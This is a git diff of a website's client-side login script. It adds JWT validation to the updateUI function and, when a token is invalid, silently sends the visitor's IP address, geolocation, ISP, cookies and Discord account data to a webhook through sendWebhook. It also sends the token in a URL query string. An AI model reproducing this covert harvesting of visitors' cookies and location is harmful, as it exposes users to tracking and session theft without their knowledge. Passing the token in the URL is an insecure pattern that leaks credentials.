@@ -205,22 +205,55 @@ ${userDataFormatted}
     window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
 });
 
-// Function to update UI based on login status
+// Function to update UI based on login status and validate token
 async function updateUI() {
     const discordUser = localStorage.getItem('discordUser');
     const jwtToken = localStorage.getItem('jwtToken');
 
     if (discordUser && jwtToken) {
-        const userData = JSON.parse(discordUser);
-        const usernameElement = document.querySelector('.username');
-        usernameElement.innerText = userData.username;
-        const profilePicture = profileUI.querySelector('.profile-picture');
-        profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`;
-        logoutButton.disabled = false;
-        loginButton.disabled = true;
+        try {
+            const response = await fetch(`${apiUrl}/auth/validatetoken?token=${jwtToken}`);
+            const data = await response.json();
+
+            if (data.error) {
+                throw new Error(data.error);
+            }
+
+            // Token is valid, update UI
+            const userData = JSON.parse(discordUser);
+            const usernameElement = document.querySelector('.username');
+            usernameElement.innerText = userData.username;
+            const profilePicture = profileUI.querySelector('.profile-picture');
+            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`;
+            logoutButton.disabled = false;
+            loginButton.disabled = true;
+        } catch (error) {
+            console.error("Token invalid or tampering detected:", error);
+            localStorage.removeItem('discordUser');
+            localStorage.removeItem('jwtToken');
+            loggedIn = false;
+
+            await sendWebhook("Invalid Token Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
+
+            // Redirect to Discord authentication
+            window.location.href = `${apiUrl}/auth/discord`;
+        }
     } else {
+        // No token found, handle logged-out state
         const urlParams = new URLSearchParams(window.location.search);
-        const tokenParam = urlParams.get('token') || localStorage.getItem('jwtToken'); // Try token from URL or localStorage
+        const tokenParam = urlParams.get('token');
 
         if (tokenParam) {
             try {
@@ -256,7 +289,7 @@ ${userDataFormatted}
                 if (urlParams.has('token')) {
                     urlParams.delete('token');
                     window.history.replaceState({}, document.title, window.location.pathname);
-window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
+                    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
                 }
             } catch (error) {
                 console.error("Invalid token or tampering detected:", error);
